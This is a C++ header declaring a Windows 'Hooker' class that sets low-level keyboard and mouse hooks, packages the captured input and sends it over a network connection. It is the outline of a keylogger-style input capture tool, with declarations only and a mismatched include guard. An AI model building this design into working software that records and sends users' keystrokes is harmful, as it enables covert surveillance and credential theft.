#ifndef HOOKER_HH_
# define HOOKER_HH__

# define WIN32_LEAN_AND_MEAN

# include <Windows.h>
# include <iostream>
# include <math.h>
# include "reseau\Network.hh"
# include "Packager.h"

class Hooker {
protected:
	HHOOK _kHook;
	HHOOK _mHook;
	bool _connected;
	Network* _network;
	Packager _packager;
	POINT _previousPoint;

public:
	static Hooker& getInstance();

	void runHookLoop();
	bool initializeHooks();
	void deInitializeHooks();
	void receiveCallback(int nCode, WPARAM wParam, LPARAM lParam, bool isMouse = false);
	void sendPaquet();
	bool connect();

	bool& isConnected();
	Network& getNetwork() const;
	void setNetwork(Network* network);

protected:
	Hooker();
	~Hooker();
};

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam);

#endif /* !HOOKER_HH_ */
